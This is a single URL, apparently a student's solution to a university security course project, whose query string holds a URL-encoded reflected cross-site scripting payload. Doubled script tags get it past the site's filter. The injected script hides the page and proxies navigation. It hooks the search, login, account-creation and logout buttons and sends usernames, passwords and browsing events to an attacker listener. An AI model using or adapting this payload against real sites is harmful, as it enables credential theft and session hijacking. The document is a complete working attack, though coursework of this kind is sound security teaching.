http://cis551.cis.upenn.edu/project3/search?xssdefense=2&q=%3Csscriptcript%3Efunction%20payload3(attacker)%7B%0A%09function%20proxy(href%2Cpurl%2Cstat)%7B%0A%09%09%24(%27html%27).load(href%2Cfunction()%7B%0A%09%09%24(%27html%27).show()%3B%0A%09%09%09%24(%27a%3Acontains(%22%3Cscript%3E%22)%27).hide()%3B%24(%27a%3Acontains(%22%3Csscriptcript%3E%22)%27).hide()%3B%0A%09%09%09var%20ad%3D%27http%3A%2F%2Fcis551.cis.upenn.edu%2Fproject3%2F%27%3B%0A%09%09%09var%20ru%3Dwindow.location.href%3B%0A%09%09%09history.replaceState(window.history.state%2C%27%2Fproject3%27%2C%27%2Fproject3%27)%3B%0A%09%09%20%20%20%20%24(%27%23search-btn%27).click(function(e)%7Be.preventDefault()%3B%0A%09%09%20%20%20%20%20%20var%20q%3D%24(%27%23query%27).val().split(%27%20%27).join(%27%2B%27)%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%27search%3Fq%3D%27%2Bq%7D).done(function(e)%7Bdocument.write(e)%3B%0A%09%09%09%20%20%09setTimeout(function()%7Bproxy(ad%2B%27search%3Fq%3D%27%2Bq%2Cru%2C1)%3B%7D%2C500)%3B%7D)%3B%0A%09%09%09%20%20%24.get(attacker%2B%27stolen%3Fevent%3Dnav%26user%3D%27%2B%24(%27%23logged-in-user%27).text()%2B%27%26url%3D%27%2Bad%2B%27search%3Fq%3D%27%2Bq)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%20%20%20%20%20%20%20%20%24(%27%23search-again-btn%27).click(function(e)%7Be.preventDefault()%3B%0A%09%09%09%20%20%24.get(attacker%2B%27stolen%3Fevent%3Dnav%26user%3D%27%2B%24(%27%23logged-in-user%27).text()%2B%27%26url%3D%27%2Bad%2B%27search%27)%3B%0A%09%09%09%20%20window.location.replace(purl)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%20%0A%09%09%20%20%20%20%24(%27%23log-in-btn%27).click(function(e)%7B%0A%09%09%20%20%20%20%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%27login%3Fcsrfdefense%3D0%27%2Cmethod%3A%27POST%27%2Cdata%3A%7Busername%3A%24(%27%23username%27).val()%2Cpassword%3A%24(%27%23userpass%27).val()%7D%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%20%20window.location.replace(ru)%3B%3B%7D%7D)%3B%0A%09%09%09%20%20%24.get(attacker%2B%27stolen%3Fevent%3Dlogin%26user%3D%27%2B%24(%27%23username%27).val()%2B%27%26pass%3D%27%2B%24(%27%23userpass%27).val())%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%20%20%20%20%24(%27%23new-account-btn%27).click(function(e)%7Be.preventDefault()%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%27create%3Fcsrfdefense%3D0%27%2Cmethod%3A%27POST%27%2Cdata%3A%7Busername%3A%24(%27%23username%27).val()%2Cpassword%3A%24(%27%23userpass%27).val()%7D%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%20%20window.location.replace(ru)%3B%3B%7D%7D)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%20%20%20%20%24(%27%23log-out-btn%27).click(function(e)%7Be.preventDefault()%3B%0A%09%09%09%20%20%24.get(attacker%2B%27stolen%3Fevent%3Dlogout%26user%3D%27%2B%24(%27%23logged-in-user%27).text())%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%27logout%3Fcsrfdefense%3D0%27%2Cmethod%3A%27POST%27%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%09if(stat%3D%3D0)%7Bwindow.location.replace(ru)%3B%7Delse%7Bwindow.location.replace(purl)%3B%7D%7D%7D)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%09%7D)%3B%0A%09%09%7D%0A%09%24(%27html%27).hide()%3B%0A%09proxy(%27.%2F%27%2C%27.%2F%27%2C0)%3B%0A%7D%3Bpayload3(%22http%3A%2F%2F127.0.0.1%3A31337%2F%22)%3B%3C%2Fsscriptcript%3E